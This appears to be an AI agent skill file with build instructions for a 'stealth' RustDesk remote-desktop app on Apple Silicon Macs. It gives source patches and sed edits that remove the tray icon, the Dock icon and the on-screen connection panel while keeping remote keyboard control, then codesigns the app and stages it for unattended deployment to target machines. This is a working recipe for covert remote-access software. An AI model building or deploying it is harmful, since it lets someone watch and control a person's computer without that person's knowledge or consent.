---
name: build-stealth-rustdesk
description: Build a patched, fully-stealth RustDesk.app from source on Apple Silicon, from a maintained private fork — no menu-bar icon, no Dock icon, no on-screen CM panel compiled in, remote keyboard still works, codesigned and ready to deploy. Use when building or version-bumping the stealth RustDesk binary; deploy the result with the deploy-stealth-rustdesk skill.
disable-model-invocation: true
---

# Build stealth RustDesk from source (macOS, Apple Silicon)

Produce a signed `RustDesk.app` with **three stealth surfaces** suppressed in the binary — the **menu-bar (tray) icon**, the **Dock icon**, and the **CM panel** (the connection-management window that floats top-right during a session) — while remote **keyboard** still works. The built app is the artifact; **deploy it as an unattended service with the `deploy-stealth-rustdesk` skill**.

Why build from source: the obvious shortcut — the `hide-tray=Y` custom-client flag — springs the **daemon trap**. It makes RustDesk install as a *LaunchDaemon*, which runs outside the user's GUI session and silently kills remote keyboard input ([rustdesk#10709](https://github.com/rustdesk/rustdesk/issues/10709)); on macOS 26 such clients may not even launch. The only path that is both invisible and controllable keeps RustDesk a **LaunchAgent** (user session) and just skips *drawing* the tray icon — a one-line patch. Installing as a LaunchAgent is `deploy-stealth-rustdesk`'s job; this skill compiles the patch in.

Each surface needs a different mechanism — there is no single toggle:

| Surface | Suppressed by |
|---|---|
| Tray / menu-bar icon | `assets/stealth.patch` → `src/tray.rs` (compiled in here) |
| Dock icon | `LSUIElement=1` (stock) **plus** a `window_manager` patch (Step 4) — the CM/GUI window flips the app to a `.regular` activation policy on connect, which defeats `LSUIElement` and shows a Dock icon unless patched |
| CM connection panel | `assets/stealth.patch` → `src/ipc.rs` un-gates the feature here; **`deploy-stealth-rustdesk`'s config then turns it on** |

Upstream restricts the hide-CM feature to Pro / custom-client builds (`is_custom_client()` is just `get_app_name() != "RustDesk"`), so on a vanilla from-source build no config value alone will hide the CM panel — the `ipc.rs` hunk removes that gate. **The gate removal only pays off when deploy sets its three config options** (`approve-mode` + `verification-method` + `allow-hide-cm`); without them the CM panel still shows. That coupling is the interface to `deploy-stealth-rustdesk`.

**Pins — RustDesk 1.4.8, Apple Silicon.** Version drift is the top build-failure cause; match exactly. For any other tag, re-derive them first (`REFERENCE.md` → "Re-deriving pins").

- Rust `1.81` · Flutter `3.24.5` (exact) · vcpkg `@120deac3062162151622ca4860575a33844ba10b` · cargo-expand `1.0.95` · flutter_rust_bridge_codegen `1.80.1`
- vcpkg triplet `arm64-osx` · build features `flutter,hwcodec,unix-file-copy-paste` · **full Xcode** (not just Command Line Tools)

Set once, used throughout (`$SKILL_DIR` = this skill's folder):

```bash
BUILD=~/rustdesk-build
export VCPKG_ROOT="$BUILD/vcpkg"
export PATH="$BUILD/flutter-sdk/flutter/bin:$HOME/.cargo/bin:$PATH"
APP="$BUILD/rustdesk/flutter/build/macos/Build/Products/Release/RustDesk.app"
```

## Step 1 — Maintain the private fork (source of truth)

Keep a **private fork** of `rustdesk/rustdesk` with the two `stealth.patch` hunks committed on top of the upstream release tag. Version bumps then become a `git rebase`/`cherry-pick` — not the "re-locate the two sites by hand" that a raw `git apply` forces when upstream code moves. Use the **`private-fork-sync` skill** for the generic "make the fork private + keep it fast-forward-synced with upstream" mechanics; the stealth-specific part is below.

First-time setup:

```bash
# Fork rustdesk/rustdesk -> your account, make it private + wire upstream (private-fork-sync skill).
# (Alternative: a detached private mirror — bare-clone rustdesk, push to a fresh private repo — if
#  you don't want a GitHub "fork" object; it sidesteps the fork-network privacy caveats.)
git clone git@github.com:<you>/rustdesk.git "$BUILD/rustdesk-fork" && cd "$BUILD/rustdesk-fork"
git remote add upstream https://github.com/rustdesk/rustdesk.git && git fetch upstream --tags
git checkout -b stealth-1.4.8 1.4.8
git apply "$SKILL_DIR/assets/stealth.patch"
git commit -am "STEALTH BUILD PATCH: hide tray + un-gate hide-cm (tray.rs, ipc.rs)"
git push origin stealth-1.4.8
```

Version bump (e.g. 1.4.8 → 1.4.9):

```bash
git fetch upstream --tags
git rebase --onto 1.4.9 1.4.8 stealth-1.4.8   # or cherry-pick the stealth commit onto 1.4.9
# conflicts localize to src/ipc.rs + src/tray.rs; resolve, re-derive the pins (REFERENCE.md), retag:
git branch -m stealth-1.4.9 && git push -u origin stealth-1.4.9
```

Only `src/ipc.rs` and `src/tray.rs` change — both main-repo files, so submodules (`hbb_common`, vcpkg) resolve to their own upstreams and need **no** fork. Two other stealth fixes live OUTSIDE the fork and are re-applied per build (`window_manager`, Step 4) or per deploy (agent `KeepAlive`, in `deploy-stealth-rustdesk`). Note: privatizing a fork blocks PRs to the public parent (fine — these are never upstreamed) and drops prior collaborators.

**Done when:** `git ls-remote --heads origin stealth-1.4.8` returns a ref, and `git show stealth-1.4.8:src/tray.rs | grep -c 'STEALTH BUILD PATCH'` is `1`.

## Step 2 — Pin the toolchain

Install/verify every pin above. Full Xcode must be the active developer dir:
`sudo xcode-select -s /Applications/Xcode.app/Contents/Developer && sudo xcodebuild -license accept && sudo xcodebuild -runFirstLaunch`.
`rustup install 1.81`; download Flutter **3.24.5** exact from the Flutter release archive (NOT `brew install flutter` — that is latest and will break codegen); `brew install nasm cmake pkg-config cocoapods`; clone vcpkg into `$VCPKG_ROOT`, `git checkout` the pinned commit, `./bootstrap-vcpkg.sh -disableMetrics`; `cargo +1.81 install cargo-expand --version 1.0.95 --locked` and `cargo +1.81 install flutter_rust_bridge_codegen --version 1.80.1 --features uuid --locked`.

**Done when:** `flutter doctor` shows Xcode ✓, `$VCPKG_ROOT/vcpkg version` runs, and `flutter_rust_bridge_codegen --version` prints `1.80.1`.

## Step 3 — Clone the stealth source

Primary — clone your fork's stealth branch (patch already committed):

```bash
git clone --depth 1 --branch stealth-1.4.8 --recurse-submodules --shallow-submodules \
  git@github.com:<you>/rustdesk.git "$BUILD/rustdesk"
cd "$BUILD/rustdesk" && rustup override set 1.81
```

Fallback (no fork) — clone upstream and apply the patch directly:

```bash
git clone --depth 1 --branch 1.4.8 --recurse-submodules --shallow-submodules \
  https://github.com/rustdesk/rustdesk.git "$BUILD/rustdesk"
cd "$BUILD/rustdesk" && rustup override set 1.81 && git apply "$SKILL_DIR/assets/stealth.patch"
```

The patch is the **only** source change — two small hunks (either path yields an identical tree):
- `src/tray.rs::make_tray()` — forces the tray's existing "start the event loop but don't create the status item" path on macOS. Keeping the event loop is what lets the `--server` process retain its main run loop → capture + input survive. Do **not** early-return `start_tray()` instead — the `--server` macOS branch depends on that loop.
- `src/ipc.rs` (`get_config` "hide_cm") — removes the `is_pro() || is_custom_client()` gate so `hide_cm()` is honored on this build. Without it, `deploy-stealth-rustdesk`'s config is silently ignored and the CM panel shows on every connect.

**Done when:** `grep -rc 'STEALTH BUILD PATCH' src/tray.rs src/ipc.rs` reports `1` for each file.

## Step 4 — `pub get`, patch window_manager (Dock fix), generate the FRB bridge

`flutter pub get` fetches the `window_manager` plugin, whose `setSkipTaskbar` calls `setActivationPolicy(.regular)` when a window shows — the one thing that defeats `LSUIElement` and puts a Dock icon up on connect. Patch it to stay `.accessory`. Then run the FRB codegen — `build.py` does **not** run it, and skipping it makes Step 5 fail with `file not found for module bridge_generated` + `EventToUI: IntoIntoDart` (errors that look unrelated to the real cause).

```bash
cd "$BUILD/rustdesk/flutter" && flutter pub get && cd ..
# Dock-icon fix (pub-cache path varies by pinned ref, so find it):
WM=$(find ~/.pub-cache -path '*window_manager*/macos/Classes/WindowManager.swift' | head -1)
sed -i '' 's|setActivationPolicy(isSkipTaskbar ? .accessory : .regular)|setActivationPolicy(.accessory) // STEALTH: never take a Dock icon|' "$WM"
flutter_rust_bridge_codegen --rust-input ./src/flutter_ffi.rs \
  --dart-output ./flutter/lib/generated_bridge.dart \
  --c-output ./flutter/macos/Runner/bridge_generated.h
```

The window_manager patch lives in pub-cache, not the RustDesk repo, so it is **not** in `assets/stealth.patch` and **cannot** live in the fork — re-apply it here on every fresh clone / `pub get`.

**Done when:** `src/bridge_generated.rs` exists (~5k lines) **and** `grep -c '\.regular' "$WM"` is `0`. Missing `bridge_generated.rs` is the most common reason the build "mysteriously" fails at Step 5 — verify before moving on.

## Step 5 — Build

```bash
cd "$BUILD/rustdesk"
MACOSX_DEPLOYMENT_TARGET=10.14 python3 build.py --flutter --hwcodec --unix-file-copy-paste
```

These are the exact features of the official 1.4.8 macOS release, so the result differs from stock only by the tray + ipc patches. First build is 30–60 min (vcpkg compiles aom/ffmpeg).

**Done when:** `"$APP/Contents/MacOS/RustDesk" --version` prints `1.4.8`.

## Step 6 — Codesign

`build.py` copies the `service` binary in *after* Xcode signs, so re-sign the whole bundle. Sign in the build dir (writable) **before** staging for deploy.

```bash
codesign --force --deep --sign - "$APP"
```

Ad-hoc (`-s -`) works, but it binds `deploy-stealth-rustdesk`'s TCC grants to this exact binary: **every rebuild changes the cdhash and silently breaks them** (symptom `Connected, waiting for image` on the deploy side). Building from a maintained fork means you *will* rebuild on updates — so sign with a **stable self-signed identity** instead, and the deploy's grants survive rebuilds. See `REFERENCE.md` → "Stable signing identity". This signing choice is the second interface to `deploy-stealth-rustdesk` (its TCC step).

**Done when:** `codesign --verify --deep --strict "$APP"` passes and prints "satisfies its Designated Requirement".

## The artifact (output contract) and hand-off

This skill's output is the signed bundle at `$APP`. **Compiled in:** tray icon suppressed (`tray.rs`), Dock icon suppressed (`LSUIElement` + `window_manager`), CM Pro/custom-client gate removed (`ipc.rs`). **Not yet done here:** the CM panel is not hidden at runtime, no password, no services installed, no TCC grants — all of that is `deploy-stealth-rustdesk`. In particular the CM panel only actually hides once deploy sets `approve-mode` + `verification-method` + `allow-hide-cm`. **The stealth payoff is verified at deploy time**, not here — this skill's checks are artifact-level (`--version`, `codesign --verify`, patch markers in source).

**Hand off to each target Mac:** stage the signed `$APP` **and** the two launchd plists `src/platform/privileges_scripts/{daemon.plist,agent.plist}` (they are not inside the .app bundle) into one folder laid out the way `deploy-stealth-rustdesk` reads by default — `APP=~/.stealth-rustdesk/RustDesk.app`, `PLISTS=~/.stealth-rustdesk/privileges_scripts` — then copy that folder to each target and run `deploy-stealth-rustdesk` there:

```bash
STAGE=~/.stealth-rustdesk                      # distinct from $BUILD; matches deploy's default paths
mkdir -p "$STAGE/privileges_scripts"
cp -R "$APP" "$STAGE/RustDesk.app"
cp "$BUILD/rustdesk/src/platform/privileges_scripts/"{daemon,agent}.plist "$STAGE/privileges_scripts/"
# copy $STAGE to each target Mac (scp -r / AirDrop / USB), then run deploy-stealth-rustdesk there
```

`deploy-stealth-rustdesk` Step 1 then consumes this folder unchanged: `RustDesk.app` → `/Applications`, `daemon.plist` → `LaunchDaemons`, `agent.plist` → `LaunchAgents`.

## Maintenance & troubleshooting

Build failures, re-deriving pins for a new tag, the fork rebase-on-bump, and setting up a stable signing identity are in **`REFERENCE.md`**. Deploy/connection issues live in the `deploy-stealth-rustdesk` skill.
